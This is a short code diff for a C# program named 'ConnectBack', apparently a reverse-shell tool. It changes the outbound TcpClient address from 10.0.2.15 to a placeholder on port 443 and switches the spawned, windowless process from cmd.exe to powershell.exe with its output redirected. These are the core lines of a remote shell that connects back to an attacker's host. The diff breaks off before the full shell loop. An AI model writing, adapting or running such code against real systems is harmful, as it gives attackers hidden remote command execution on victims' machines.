@@ -16,7 +16,7 @@ namespace ConnectBack
 
 		public static void Main(string[] args)
 		{
-			using (TcpClient client = new TcpClient("10.0.2.15", 443))
+			using (TcpClient client = new TcpClient("x.x.x.x", 443))
 			{
 				using (Stream stream = client.GetStream())
 				{
@@ -27,7 +27,7 @@ namespace ConnectBack
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.FileName = "powershell.exe";
 						p.StartInfo.CreateNoWindow = true;
 						p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
